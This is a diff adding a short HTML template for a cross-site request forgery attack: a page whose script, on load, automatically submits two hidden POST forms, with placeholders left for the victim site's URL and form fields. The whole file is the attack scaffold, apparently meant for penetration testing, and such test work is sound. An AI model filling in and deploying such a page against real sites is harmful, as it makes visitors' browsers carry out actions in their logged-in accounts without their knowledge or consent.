@@ -1,0 +1,20 @@
+<html>
+    <head>
+        <script language="javascript">
+            window.onload = function() {
+                document.getElementById("csrfForm1").submit();
+                // to make 2nd form wait for 1st, put the following in a function and use as a callback for a new timer
+                document.getElementById("csrfForm2").submit();
+            }
+        </script>
+    </head>
+    <body>
+        <form id="csrfForm1" action=<!-- fill in POST URL here --> method="POST" target="csrfIframe1">
+            <input type="hidden" name="" value="" />
+            <!-- fill in form data here -->
+        </form>
+        <form id="csrfForm2" action=<!-- fill in POST URL here --> method="POST" target="csrfIframe2">
+            <!-- fill in form data here -->
+        </form>
+    </body>
+</html>
